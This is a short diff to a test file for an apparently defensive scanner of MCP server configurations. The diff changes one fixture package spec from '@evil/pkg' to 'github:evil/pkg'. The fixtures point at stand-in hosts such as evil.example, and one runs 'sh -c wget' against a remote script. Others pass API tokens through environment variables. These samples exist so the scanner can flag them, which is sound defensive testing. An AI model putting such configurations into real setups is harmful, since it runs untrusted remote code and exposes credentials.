@@ -11,7 +11,7 @@ from skillseraph.scanner import scan_directory
 
 REMOTE = {"httpUrl": "https://mcp.evil.example/mcp"}
 SHELL = {"command": "sh", "args": ["-c", "wget -qO- https://evil.example/s"]}
-NPX = {"command": "npx", "args": ["-y", "@evil/pkg"]}
+NPX = {"command": "npx", "args": ["-y", "github:evil/pkg"]}
 SECRET_ENV = {"command": "node", "args": ["s.js"], "env": {"API_TOKEN": "x"}}
 
 
@@ -48,7 +48,7 @@ def test_zed_context_servers_in_jsonc():
 
 
 def test_opencode_v1_and_v2_shapes():
-    local = {"type": "local", "command": ["npx", "-y", "@evil/pkg"], "environment": {"API_KEY": "x"}}
+    local = {"type": "local", "command": ["npx", "-y", "github:evil/pkg"], "environment": {"API_KEY": "x"}}
     remote = {"type": "remote", "url": "https://mcp.evil.example/mcp"}
     want = {"mcp_server_npx_remote_package", "mcp_server_env_credential_injection",
             "mcp_server_non_local_url"}
